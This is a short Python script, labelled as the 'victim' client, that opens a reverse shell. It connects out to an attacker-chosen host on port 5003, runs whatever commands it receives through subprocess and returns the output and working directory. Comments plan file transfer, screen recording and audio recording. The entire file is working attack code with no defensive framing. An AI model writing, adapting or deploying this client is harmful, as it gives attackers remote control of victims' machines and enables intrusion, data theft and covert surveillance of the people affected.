import socket, os, subprocess, sys

# IMPROVEMENTS

# Add download and upload commands: Transfer files with socket
# Custom command to record screen and download the video
# Command to record audio

# CLIENT SIDE - Victim

SERVER_HOST = sys.argv[1]
SERVER_PORT = 5003
BUFFER_SIZE = 1024 * 128
SEPARATOR = "<sep>"

client = socket.socket()
client.connect((SERVER_HOST, SERVER_PORT))

cwd = os.getcwd()
client.send(cwd.encode())

while True:
    command = client.recv(BUFFER_SIZE).decode()
    splitted_command = command.split()

    if command.lower() == "exit":
        break

    if splitted_command[0].lower() == "cd":
        try:
            os.chdir(" ".join(splitted_command[1:]))
        except FileNotFoundError as error:
            output = str(error)
        else:
            output = ""

    else:
        output = subprocess.getoutput(command)

    cwd = os.getcwd()
    message = f"{output}{SEPARATOR}{cwd}"
    client.send(message.encode())

client.close()